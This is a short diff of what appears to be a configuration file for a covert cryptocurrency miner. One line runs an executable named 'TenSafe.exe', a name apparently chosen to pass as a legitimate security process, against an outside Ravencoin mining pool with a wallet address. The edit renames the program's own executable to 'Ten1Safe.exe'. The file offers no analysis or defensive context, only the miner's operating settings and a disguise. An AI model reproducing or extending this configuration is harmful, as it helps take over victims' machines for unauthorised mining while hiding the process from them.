@@ -25,7 +25,7 @@ A7A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RBBiWq
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
 A0A--\TenSafe.exe--A0A
-A8A--TenSafe.exe--A8A---自身
+A8A--Ten1Safe.exe--A8A---自身
 ------------------------------------------------------------------------------------------------------------------------------------
 B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取程
 B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---
